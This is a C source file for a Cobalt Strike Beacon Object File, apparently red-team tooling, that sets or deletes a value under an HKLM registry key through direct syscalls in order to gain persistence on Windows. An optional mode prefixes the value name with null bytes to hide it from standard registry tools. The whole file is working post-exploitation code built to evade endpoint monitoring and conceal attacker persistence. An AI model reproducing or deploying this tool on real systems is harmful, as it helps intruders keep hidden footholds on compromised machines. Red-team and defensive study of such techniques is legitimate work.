////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//      PERSISTELEVATEDREGKEY BOF                                                                                     //
//                                                                                                                    //
//      POWERED BY: CobaltWhispers, SysWhispers2, InlineWhispers2                                                     //
//      AUTHOR: @Cerbersec                                                                                            //
//      PROPERTY OF: @NVISOsecurity                                                                                   //
//                                                                                                                    //
//      COMPILE WITH: gcc -o PersistElevatedRegKey.o -c PersistElevatedRegKey.c -masm=intel                           //
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#include <windows.h>
#include "beacon.h"
#include "syscalls.c"

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//                                                      IMPORTS                                                       //
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

DECLSPEC_IMPORT size_t MSVCRT$wcslen(const wchar_t*);
DECLSPEC_IMPORT wchar_t* MSVCRT$wcscat(wchar_t*, const wchar_t*);
DECLSPEC_IMPORT NTSYSAPI NTSTATUS NTAPI NTDLL$RtlOpenCurrentUser(ACCESS_MASK, PHANDLE);

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//                                                         MAIN                                                       //
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

void go(char* args, int alen) {

    /*==================================*/
    /*              PAYLOAD             */
    /*==================================*/

    datap parser;
    BeaconDataParse(&parser, args, alen);

    char* buff1 = BeaconDataExtract(&parser, NULL);
    char* buff2 = BeaconDataExtract(&parser, NULL);
    char* buff3 = BeaconDataExtract(&parser, NULL);

    //TODO: change memory allocation
    wchar_t name[300];
    wchar_t regKeyName[300];
    wchar_t vData[300];

    toWideChar(buff1, name, 300);
    toWideChar(buff2, regKeyName, 300);
    toWideChar(buff3, vData, 300);
    int hidden = BeaconDataInt(&parser);
    int cleanup = BeaconDataInt(&parser);

    /*==================================*/
    /*          SETTING UP KEYS         */
    /*==================================*/

    NTSTATUS status;

    wchar_t prefix[200] = L"xx";
    if(hidden)
    {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Hidden key selected");
        MSVCRT$wcscat(prefix, regKeyName);
    }

    HANDLE key, root;
    OBJECT_ATTRIBUTES oa;
    UNICODE_STRING keyName;

    //TODO: change memory allocation
    wchar_t hklm[200] = L"\\REGISTRY\\MACHINE\\";
    MSVCRT$wcscat(hklm, name);
    keyName.Buffer = hklm;
    keyName.Length = MSVCRT$wcslen(hklm) * 2;
    keyName.MaximumLength = 0;
    InitializeObjectAttributes(&oa, &keyName, OBJ_CASE_INSENSITIVE, NULL ,NULL);

    status = NtOpenKeyEx(&key, KEY_WRITE, &oa, 0);
    if(status != STATUS_SUCCESS){
        BeaconPrintf(CALLBACK_ERROR, "Could not open key: %x", status);
        NtClose(key);
        NtClose(root);
        return;
    }

    UNICODE_STRING valueName;
    if(hidden){
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Prefixing with nullbytes");
        // replace prefixed bytes with nullbytes
        valueName.Buffer = prefix;
        valueName.Length = MSVCRT$wcslen(prefix) * 2;
        valueName.Buffer[0] = '\0';
        valueName.Buffer[1] = '\0';
    }
    else
    {
        valueName.Buffer = regKeyName;
        valueName.Length = MSVCRT$wcslen(regKeyName) * 2;
    }
    valueName.MaximumLength = 0;

    if(cleanup)
    {
        status = NtDeleteValueKey(key, &valueName);
        if(status != STATUS_SUCCESS){
            BeaconPrintf(CALLBACK_ERROR, "Could not delete key: %x", status);
            NtClose(key);
            NtClose(root);
            return;
        }
    }
    else
    {
        status = NtSetValueKey(key, &valueName, 0, REG_SZ, (PVOID)vData, MSVCRT$wcslen(vData) * 2);
        if(status != STATUS_SUCCESS){
            BeaconPrintf(CALLBACK_ERROR, "Could not set key value: %x", status);
            NtClose(key);
            NtClose(root);
            return;
        }
    }

    NtClose(key);
    NtClose(root);

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Done");
}